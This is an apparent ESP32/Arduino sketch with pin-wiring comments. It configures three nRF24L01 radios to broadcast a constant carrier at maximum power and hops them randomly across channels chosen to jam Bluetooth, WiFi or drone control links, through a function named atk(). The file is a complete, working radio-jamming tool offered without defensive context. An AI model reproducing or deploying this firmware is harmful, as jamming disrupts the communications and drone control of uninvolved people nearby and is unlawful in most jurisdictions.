//  --Library:
//    |Select board
//    |RF24.h
//  --Setup (Nrf|Esp) (1 & Gnd // 2 & 3.3v):
//    |pin 5;6;7 connect to (Esp):
//       |14;13;12
//       |18;23;19
//    |RF_1:
//       |3 & 16
//       |4 & 15
//    |RF_2:
//       |3 & 22
//       |4 & 21
//    |RF_3:
//       |3 & 26
//       |4 & 25

// Mode: |81:Bluetooth|15:Wifi|126:Drone|
#define Mode 81

#include "RF24.h"
#include <SPI.h>
SPIClass vspi(VSPI);
RF24 radio1(16, 15, 16000000);
RF24 radio2(22, 21, 16000000);
RF24 radio3(26, 25 ,16000000);
void atk() {
  if (radio1.begin(&vspi)) {
    radio1.setAutoAck(false);
    radio1.stopListening();
    radio1.setRetries(0, 0);
    radio1.setPALevel(RF24_PA_MAX, true);
    radio1.setDataRate(RF24_2MBPS);
    radio1.setCRCLength(RF24_CRC_DISABLED);
    radio1.startConstCarrier(RF24_PA_MAX, 45);}
  if (radio2.begin(&vspi)) {
    radio2.setAutoAck(false);
    radio2.stopListening();
    radio2.setRetries(0, 0);
    radio2.setPALevel(RF24_PA_MAX, true);
    radio2.setDataRate(RF24_2MBPS);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.startConstCarrier(RF24_PA_MAX, 45);}
  if (radio3.begin(&vspi)) {
    radio3.setAutoAck(false);
    radio3.stopListening();
    radio3.setRetries(0, 0);
    radio3.setPALevel(RF24_PA_MAX, true);
    radio3.setDataRate(RF24_2MBPS);
    radio3.setCRCLength(RF24_CRC_DISABLED);
    radio3.startConstCarrier(RF24_PA_MAX, 45);}}
void setup() {atk();}
void loop() {
  radio1.setChannel(random(Mode));
  radio2.setChannel(random(Mode));
  radio3.setChannel(random(Mode));}